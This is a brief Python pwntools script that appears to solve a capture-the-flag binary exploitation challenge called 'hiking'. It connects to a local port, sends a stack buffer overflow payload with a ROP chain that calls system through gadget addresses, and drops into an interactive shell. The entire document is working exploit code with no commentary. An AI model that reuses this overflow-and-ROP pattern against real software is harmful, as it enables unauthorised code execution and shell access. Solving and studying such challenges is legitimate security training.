from pwn import *

context.log_level = 'debug'

p = remote("127.0.0.1", 26146)
#p = process("./hiking")
e = ELF("./hiking")

pr = 0x000000000040121e
ret = 0x000000000040101a

pay = b'A'*0x28
pay += p64(pr) + p64(e.sym["shell"])+ p64(ret) + p64(e.sym["system"]-4)

#p.sendline('1')

p.sendlineafter(b">", '1')

pause()
p.sendafter(b"> ", pay)

p.interactive()
